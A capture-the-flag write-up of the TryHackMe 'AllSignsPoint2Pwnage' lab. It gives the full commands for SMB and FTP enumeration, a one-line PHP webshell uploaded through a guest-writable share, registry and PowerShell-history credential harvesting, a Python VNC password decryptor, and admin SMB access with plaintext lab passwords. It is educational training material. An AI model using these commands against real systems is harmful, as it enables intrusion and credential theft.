# TryHackMe — AllSignsPoint2Pwnage

> **Difficulty:** Medium  
> **OS:** Windows 10 (Build 18362)  
> **Tags:** Digital Signage, XAMPP, SMB, VNC, Windows Privesc, Information Disclosure  
> **Author Writeup by:** [nos010101](https://tryhackme.com/p/nos010101)

---

## Summary

A hastily deployed Windows-based digital signage system exposes multiple layers of misconfiguration: anonymous FTP leaks operational notes, a guest-writable SMB share maps directly into the Apache webroot enabling PHP webshell upload, `phpinfo()` left accessible in production discloses the runtime user, AutoLogon stores the user password in plaintext registry, PowerShell command history exposes the Administrator password, and UltraVNC stores credentials encrypted with a well-known fixed DES key. The full chain demonstrates how "quick and dirty" deployments compound into total system compromise.

---

## Attack Chain Overview

```
FTP Anonymous → notice.txt (intel: images moved to hidden SMB share)
  → SMB guest write to images$ → PHP webshell in Apache webroot
    → RCE as "sign" → phpinfo() leaks USERNAME
      → Registry AutoLogon → sign password (plaintext)
        → PSReadLine history → Administrator password (plaintext)
          → ultravnc.ini → DES fixed-key decrypt → VNC password
            → SMB C$ as Administrator → admin_flag.txt
```

---

## Reconnaissance

### Port Scan (TCP < 1024)

```bash
nmap -sS -p 1-1023 -T4 -sV <TARGET_IP>
```

```
PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
80/tcp  open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
445/tcp open  microsoft-ds?
```

> **Answer: `6` open TCP ports below 1024**

**Key observations:**
- Apache on Windows (not IIS) → XAMPP/WampServer stack, manually installed
- PHP 7.4.11 (October 2020, EOL) + OpenSSL 1.1.1g → outdated components
- Both FTP and SMB open → multiple file-access vectors

### Extended Port Scan (1024–65535)

```bash
nmap -sS -p 1024-65535 --open -T4 <TARGET_IP>
```

```
PORT      STATE SERVICE
3389/tcp  open  ms-wbt-server    # RDP
5040/tcp  open  unknown
5900/tcp  open  vnc              # UltraVNC
49664-49680/tcp  open  unknown   # Dynamic RPC
```

Notable: **RDP (3389)** and **VNC (5900)** — two remote desktop protocols, typical for digital signage management.

### SMB Enumeration

```bash
smbclient -L //<TARGET_IP> -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
images$         Disk
Installs$       Disk
IPC$            IPC       Remote IPC
Users           Disk
```

Two **custom hidden shares** (suffix `$`):
- `images$` — accessible via guest authentication
- `Installs$` — access denied for non-admin (via SMB ACL)

> **Answer: The hidden folder for images is `im****$`**  
> **Answer: The admin-only hidden share is `Ins*****$`**

---

## Task 2 — Identifying the Console User

### FTP Anonymous Access

```bash
ftp <TARGET_IP>
# Login: anonymous / (blank)
ftp> ls
  notice.txt
ftp> get notice.txt
```

```
NOTICE
======
Due to customer complaints about using FTP we have now moved 'images' to 
a hidden windows file share for upload and management of images.
- Dev Team
```

This confirms `images$` is the target share for content upload.

### Web Application Analysis

```bash
curl -sk https://<TARGET_IP>/
```

The site runs a **"Simple Slide Show"** — JavaScript fetches image metadata from `/content.php` (JSON array) and rotates images from `/images/` directory on a 10-second interval. This confirms `images$` SMB share maps to the web-accessible `/images/` path.

### Information Disclosure via phpinfo()

Directory busting revealed `/dashboard/` (standard XAMPP panel) with an accessible `phpinfo.php`:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -t 50 -x php
```

Key findings: `/dashboard/` (301), `/content.php` (200), `/phpmyadmin` (403), `/images` (301).

Extracting environment variables:

```bash
curl -sk http://<TARGET_IP>/dashboard/phpinfo.php | grep -i 'USERNAME\|USERPROFILE\|DOCUMENT_ROOT'
```

```
USERNAME      = sign
USERPROFILE   = C:\Users\sign
DOCUMENT_ROOT = C:/xampp/htdocs
PATH          = ...C:\Users\sign\AppData\Local\Microsoft\WindowsApps
```

> **Answer: The user logged into the console session is `s**n`**

**CWE-200 (Information Exposure):** `phpinfo()` accessible in production leaks the full runtime environment — username, filesystem paths, loaded modules, and server configuration. WSTG-INFO-05 maps this finding.

---

## Task 3 — Exploitation

### Webshell Upload via SMB → RCE

The attack leverages the fact that `images$` SMB share maps directly to `C:\xampp\htdocs\images\` — a subdirectory of the Apache document root. Guest has write access to this share, and Apache processes `.php` files from any subdirectory.

```bash
# Create PHP webshell
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > cmd.php

# Upload via SMB with guest authentication
smbclient //<TARGET_IP>/images$ -U 'guest%' -c 'put cmd.php cmd.php'

# Verify RCE
curl -s "http://<TARGET_IP>/images/cmd.php?cmd=whoami"
# Output: desktop-997gg7d\sign
```

### User Flag

```bash
curl -s "http://<TARGET_IP>/images/cmd.php?cmd=type+C:\Users\sign\Desktop\user_flag.txt"
```

> **Answer: `thm{48u51n9_5y573m_func710n4117y_f02_****_4nd_p20f17}`**

### Password Recovery — User (AutoLogon)

Digital signage systems require automatic login at boot. Windows stores AutoLogon credentials in the registry — **in plaintext**:

```bash
curl -s "http://<TARGET_IP>/images/cmd.php?cmd=reg+query+%22HKLM\SOFTWARE\Microsoft\Windows+NT\CurrentVersion\Winlogon%22"
```

```
AutoAdminLogon    REG_DWORD    0x1
DefaultUsername   REG_SZ       .\sign
DefaultPassword   REG_SZ       gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH
DisableCAD        REG_DWORD    0x1
```

> **Answer: User password is `gKY1uxHLuU1zzlI4wwdAc*****************************eSH`**

**CWE-256 (Plaintext Storage of a Password):** AutoLogon stores the password unencrypted in `HKLM\...\Winlogon\DefaultPassword`, readable by any local user.

### Password Recovery — Administrator (PSReadLine History)

Since `sign` is only in the `Users` group (not Administrators), we need to escalate. The `Installs$` share was denied via SMB ACL, but the webshell accesses the filesystem **locally**, bypassing share-level ACL:

```bash
# SMB ACL blocked this — but NTFS ACL allows local read
curl -s "http://<TARGET_IP>/images/cmd.php?cmd=dir+C:\Installs"
```

```
Install Guide.txt
Install_www_and_deploy.bat
PsExec.exe
simepleslide/
simepleslide.zip
startup.bat
ultravnc.ini
UltraVNC_1_2_40_X64_Setup.exe
xampp-windows-x64-7.4.11-0-VC15-installer.exe
```

The critical find — **PowerShell command history**:

```bash
curl -s "http://<TARGET_IP>/images/cmd.php?cmd=type+C:\Users\sign\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

```
cd C:\Installs\
psexec -accepteula -nobanner -u administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi powershell
.\psexec -accepteula -nobanner -u administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi cmd
```

> **Answer: Administrator password is `RCYCc3GIjM0v98HDVJ1KOuUm4x*****************************rCi`**
> **Answer: The executable used is `Ps****.exe`**

**CWE-532 (Information Exposure Through Log Files):** PSReadLine records all PowerShell commands to `ConsoleHost_history.txt`, including those with credentials passed as arguments. This is one of the first places to check during Windows privilege escalation.

### Password Recovery — VNC (DES Fixed-Key Decryption)

The `ultravnc.ini` file from `C:\Installs` contains an obfuscated password:

```ini
[ultravnc]
passwd=B3A8F2D8BEA2F1FA70
passwd2=5AB2CDC0BADCAF13F1
```

All VNC implementations (RealVNC, TightVNC, UltraVNC) encrypt stored passwords using **DES-ECB with a publicly known fixed key**: `\x17\x52\x6b\x06\x23\x4e\x58\x07`. This is obfuscation, not real encryption.

**Decryption script (Python):**

```python
from Crypto.Cipher import DES
import binascii

# Fixed VNC DES key (public since original AT&T VNC in the 1990s)
key = bytes([0x17, 0x52, 0x6b, 0x06, 0x23, 0x4e, 0x58, 0x07])

# VNC quirk: reverse bit order in each key byte
def reverse_bits(byte):
    result = 0
    for i in range(8):
        result |= ((byte >> i) & 1) << (7 - i)
    return result

real_key = bytes([reverse_bits(b) for b in key])

# Encrypted password from ultravnc.ini
enc_bytes = binascii.unhexlify('B3A8F2D8BEA2F1FA70'[:16])

cipher = DES.new(real_key, DES.MODE_ECB)
decrypted = cipher.decrypt(enc_bytes)
print('VNC Password:', decrypted.rstrip(b'\x00').decode('latin-1'))
# Output: 5upp0rt9
```

> **Answer: VNC password is `5up***t9`**

**CWE-261 (Weak Encoding for Password):** VNC's fixed-key DES is effectively a public transformation. Tools like [vncpwd](http://aluigi.altervista.org/pwdrec.htm) or the Python script above can decrypt any VNC password file instantly.

### Admin Flag

With Administrator credentials, we access the flag via SMB `C$` administrative share:

```bash
smbclient //<TARGET_IP>/C$ -U 'administrator%RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi' \
  -c 'get Users\Administrator\Desktop\admin_flag.txt -'
```

> **Answer: `thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_****1p75}`**

**Note:** PsExec via webshell returned empty output — PsExec spawns a child process through a named pipe/service, and Apache's `shell_exec()` cannot capture stdout from that architecture. Direct `type` also failed due to NTFS ACL on Administrator's Desktop denying `sign`. SMB `C$` with admin credentials was the working path.

---

## Vulnerability Summary

| # | Vulnerability | CWE | CVSS Context | Finding |
|---|---|---|---|---|
| 1 | Anonymous FTP with operational data | CWE-284 | Access Control | `notice.txt` reveals infrastructure details |
| 2 | Guest-writable SMB share in webroot | CWE-284 | Access Control | `images$` allows guest write to Apache htdocs |
| 3 | phpinfo() accessible in production | CWE-200 | Info Disclosure | Leaks USERNAME, paths, full environment |
| 4 | XAMPP default configuration exposed | CWE-1188 | Insecure Default | Dashboard, phpMyAdmin path, default passwords |
| 5 | AutoLogon plaintext password | CWE-256 | Credential Storage | Registry `DefaultPassword` in cleartext |
| 6 | Credentials in PowerShell history | CWE-532 | Log Exposure | Admin password in PSReadLine `ConsoleHost_history.txt` |
| 7 | VNC fixed-key DES password storage | CWE-261 | Weak Encoding | Publicly known key → instant decryption |
| 8 | PsExec with inline credentials | CWE-214 | Process Invocation | Password visible in command-line arguments |

---

## Key Lessons

1. **SMB Share ACL ≠ NTFS ACL:** `Installs$` denied access over SMB, but the webshell read it locally through NTFS permissions. Two independent access-control layers — bypassing one doesn't mean the other holds.

2. **phpinfo() is a pentest goldmine:** On Windows it exposes `USERNAME`, `USERPROFILE`, `PATH`, `COMPUTERNAME`, `DOCUMENT_ROOT` and every loaded module. Always check `/dashboard/phpinfo.php` on XAMPP installations.

3. **PSReadLine history is the `.bash_history` of Windows:** Located at `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`, it captures every PowerShell command including credentials passed as arguments. Check it during every Windows engagement.

4. **VNC password "encryption" is public-key DES:** The key `\x17\x52\x6b\x06\x23\x4e\x58\x07` has been publicly documented since the 1990s. Any VNC password file (RealVNC, TightVNC, UltraVNC) can be decrypted instantly.

5. **Digital signage = AutoLogon = plaintext password:** Kiosk and signage systems require unattended boot, which means `AutoAdminLogon=1` and `DefaultPassword` in the registry. This is an expected finding in this class of deployment.

6. **"Hastily deployed" = compounding misconfigurations:** No single vulnerability here is exotic. The chain works because every layer was configured for convenience over security — anonymous FTP, guest-writable shares, phpinfo in production, plaintext credentials, command history retention.

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning and service enumeration |
| `smbclient` | SMB share enumeration, file upload/download |
| `gobuster` | Web directory brute-forcing |
| `curl` | HTTP requests, webshell interaction |
| `enum4linux` | SMB/RPC enumeration |
| `nxc` (NetExec) | SMB/RDP enumeration |
| `ftp` | Anonymous FTP access |
| `Python + pycryptodome` | VNC DES password decryption |

---

## References

- [OWASP WSTG-INFO-05 — Fingerprint Web Application Framework](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Fingerprint_Web_Application_Framework)
- [CWE-256 — Plaintext Storage of a Password](https://cwe.mitre.org/data/definitions/256.html)
- [CWE-532 — Information Exposure Through Log Files](https://cwe.mitre.org/data/definitions/532.html)
- [CWE-261 — Weak Encoding for Password](https://cwe.mitre.org/data/definitions/261.html)
- [UltraVNC Password Decryption — aluigi.altervista.org](http://aluigi.altervista.org/pwdrec.htm)
- [Windows AutoLogon Security Implications — Microsoft](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)
